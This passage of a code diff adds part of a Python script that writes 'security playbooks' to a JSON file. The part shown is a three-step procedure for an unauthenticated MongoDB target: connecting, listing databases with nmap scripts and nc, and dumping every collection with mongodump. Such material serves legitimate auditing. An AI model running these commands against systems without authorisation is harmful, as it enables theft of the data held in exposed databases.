+        "steps": [
+            {
+                "step": 1,
+                "title": "Test Unauthenticated Connection",
+                "desc": "Check if MongoDB accepts connections without credentials.",
+                "kali_cmd": "mongosh --host <target>:<port> || nmap -p <port> --script mongodb-info,mongodb-databases <target>",
+                "termux_cmd": "nmap -p <port> --script mongodb-info <target>",
+                "indicator": "Enters `test>` prompt without prompting for password."
+            },
+            {
+                "step": 2,
+                "title": "List Databases and Collections",
+                "desc": "Query database names and check for sensitive data.",
+                "kali_cmd": "nmap -p <port> --script mongodb-databases <target>",
+                "termux_cmd": "nc -nv <target> <port>",
+                "indicator": "Lists database names (e.g. 'users', 'auth', 'customers')."
+            },
+            {
+                "step": 3,
+                "title": "Dump Documents from Collection",
+                "desc": "Read collections and documents.",
+                "kali_cmd": "mongodump --host <target>:<port> --out /tmp/mongodump",
+                "termux_cmd": "echo 'Run mongodump to download all database collections.'",
+                "indicator": "Successfully dumps BSON records to local disk."
+            }
+        ]
+    }
+}
+
+def main():
+    target_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'playbooks.json')
+    with open(target_path, 'w', encoding='utf-8') as f:
+        json.dump(PLAYBOOKS, f, indent=2, ensure_ascii=False)
+    print(f"[+] Successfully generated {len(PLAYBOOKS)} security playbooks at {target_path}")
+
+if __name__ == '__main__':
+    main()
